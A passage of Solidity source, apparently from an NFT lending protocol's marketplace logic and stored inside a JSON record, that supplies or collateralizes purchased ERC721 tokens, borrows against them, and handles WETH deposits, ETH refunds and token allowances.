require(\n                INToken(vars.xTokenAddress).getXTokenType() !=\n                    XTokenType.NTokenUniswapV3,\n                Errors.UNIV3_NOT_ALLOWED\n            );\n\n            // item.token == underlyingAsset but supplied after listing/offering\n            // so NToken is transferred instead\n            if (INToken(vars.xTokenAddress).ownerOf(tokenId) == address(this)) {\n                _transferAndCollateralize(\n                    reservesData,\n                    userConfig,\n                    vars,\n                    token,\n                    tokenId,\n                    onBehalfOf\n                );\n                // item.token == underlyingAsset and underlyingAsset stays in wallet\n            } else {\n                DataTypes.ERC721SupplyParams[]\n                    memory tokenData = new DataTypes.ERC721SupplyParams[](1);\n                tokenData[0] = DataTypes.ERC721SupplyParams(tokenId, true);\n                SupplyLogic.executeSupplyERC721(\n                    reservesData,\n                    userConfig,\n                    DataTypes.ExecuteSupplyERC721Params({\n                        asset: token,\n                        tokenData: tokenData,\n                        onBehalfOf: onBehalfOf,\n                        payer: address(this),\n                        referralCode: params.referralCode\n                    })\n                );\n            }\n        }\n\n        if (vars.creditAmount == 0) {\n            return;\n        }\n\n        BorrowLogic.executeBorrow(\n            reservesData,\n            reservesList,\n            userConfig,\n            DataTypes.ExecuteBorrowParams({\n                asset: vars.creditToken,\n                user: onBehalfOf,\n                onBehalfOf: onBehalfOf,\n                amount: vars.creditAmount,\n                referralCode: params.referralCode,\n                releaseUnderlying: false,\n                reservesCount: params.reservesCount,\n                oracle: params.oracle,\n                priceOracleSentinel: params.priceOracleSentinel\n            })\n        );\n    }\n\n    function _checkAllowance(address token, address operator) internal {\n        uint256 allowance = IERC20(token).allowance(address(this), operator);\n        if (allowance == 0) {\n            IERC20(token).safeApprove(operator, type(uint256).max);\n        }\n    }\n\n    function _cache(DataTypes.ExecuteMarketplaceParams memory params)\n        internal\n        pure\n        returns (MarketplaceLocalVars memory vars)\n    {\n        vars.isETH = params.credit.token == address(0);\n        vars.creditToken = vars.isETH ? params.weth : params.credit.token;\n        vars.creditAmount = params.credit.amount;\n    }\n\n    function _refundETH(uint256 ethLeft) internal {\n        if (ethLeft > 0) {\n            Address.sendValue(payable(msg.sender), ethLeft);\n        }\n    }\n\n    function _depositETH(\n        MarketplaceLocalVars memory vars,\n        DataTypes.OrderInfo memory orderInfo\n    ) internal {\n        if (\n            vars.ethLeft > 0 &&\n            orderInfo.consideration[0].itemType != ItemType.NATIVE\n        ) {\n            IWETH(vars.weth).deposit{value: vars.ethLeft}();\n            IERC20(vars.weth).safeTransferFrom(\n                address(this),\n                msg.sender,\n                vars.ethLeft\n            );\n            vars.ethLeft = 0;\n        }\n    }\n\n    function _transferAndCollateralize(\n        mapping(address => DataTypes.ReserveData) storage reservesData,\n        DataTypes.UserConfigurationMap storage userConfig,\n        MarketplaceLocalVars memory vars,\n        address token,\n        uint256 tokenId,\n        address onBehalfOf\n    ) internal {\n        uint256[] memory tokenIds = new uint256[](1);\n        tokenIds[0] = tokenId;\n\n        IERC721(vars.xTokenAddress).safeTransferFrom(\n            address(this),\n            onBehalfOf,\n            tokenId\n        );\n        SupplyLogic.executeCollateralizeERC721(\n            reservesData,\n            userConfig,\n            token,\n            tokenIds,\n            onBehalfOf\n        );\n    }\n}"
    }
  ]
}